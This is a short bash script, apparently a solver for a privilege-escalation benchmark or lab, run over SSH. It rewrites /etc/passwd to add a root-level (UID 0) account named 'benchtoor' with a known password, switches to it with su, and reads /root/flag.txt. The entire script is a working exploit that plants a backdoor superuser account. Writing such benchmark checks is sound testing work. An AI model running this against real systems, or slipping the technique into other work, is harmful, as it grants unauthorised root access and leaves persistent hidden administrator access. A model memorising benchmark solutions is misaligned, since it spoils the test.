#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
HASH=$(openssl passwd -1 -salt xx password)
# Remove prior leftover line if re-run.
grep -v "^benchtoor:" /etc/passwd > /tmp/passwd.new
printf "%s\n" "benchtoor:${HASH}:0:0::/root:/bin/bash" >> /tmp/passwd.new
cat /tmp/passwd.new > /etc/passwd
# su with password via sshpass-style echo (script).
printf "%s\n" "password" | su - benchtoor -c "cat /root/flag.txt" 2>/dev/null \
  || su - benchtoor -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
